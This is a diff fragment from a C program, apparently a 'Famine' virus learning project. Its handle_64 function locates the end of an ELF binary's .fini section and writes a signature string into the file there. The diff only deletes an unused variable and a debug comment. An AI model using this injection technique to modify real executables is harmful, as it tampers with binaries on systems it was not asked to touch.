@@ -51,13 +51,11 @@ Elf64_Addr find_fini_size_64(unsigned char *file) {
 int handle_64(unsigned char *file) {
     Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
     Elf64_Phdr *phdr = (Elf64_Phdr *)(file + ehdr->e_phoff);
-    Elf64_Shdr *shdr = (Elf64_Shdr *)(file + ehdr->e_shoff);
 
     unsigned char payload[] = "Famine version 0.7 (c)oded jul-0064 by bob\n";
     size_t size_payload = strlen(payload);
 
     size_t injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);
-    // printf("off: %x\n", injection_offset);
 
     memcpy(file + injection_offset, payload, size_payload);
 
